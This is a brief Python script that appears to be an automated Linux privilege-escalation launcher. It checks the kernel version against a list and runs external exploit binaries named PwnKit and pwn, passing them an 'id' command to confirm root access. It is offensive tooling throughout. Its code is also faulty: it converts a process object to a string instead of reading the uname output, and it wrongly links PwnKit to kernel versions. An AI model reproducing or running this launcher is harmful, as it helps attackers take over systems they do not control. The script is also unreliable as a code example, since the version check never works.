import subprocess
import os
import sys
from pathlib import Path
import pexpect


Linux_kernel = ['4.19.13', '4.19.0', '4.19.28', '5.4.0', '5.5.0', '5.7.0', '5.9.0']

kernel_name = subprocess.Popen(['uname','-r'])
kernel_name = str(kernel_name)
if kernel_name in Linux_kernel:
    if kernel_name == '5.9.0':
        args = ["./PwnKit"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"id > output.txt")[0]
        print(child_process_output)
    if kernel_name == '4.19.0':
        args = ["./pwn"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        child_process_output = child_proccess.communicate(b"id > output.txt")[0]
        print(child_process_output)